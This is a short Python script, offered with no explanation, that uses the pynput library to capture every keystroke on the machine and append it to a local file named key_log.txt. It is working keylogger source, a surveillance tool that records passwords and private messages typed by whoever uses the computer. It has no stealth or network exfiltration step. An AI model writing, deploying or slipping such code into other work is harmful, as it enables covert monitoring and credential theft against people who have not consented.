from pynput import keyboard

def on_press(key):
    try:
        with open("key_log.txt", "a") as f:
            f.write(f"{key} pressed\n")
    except Exception as e:
        print(f"Error: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()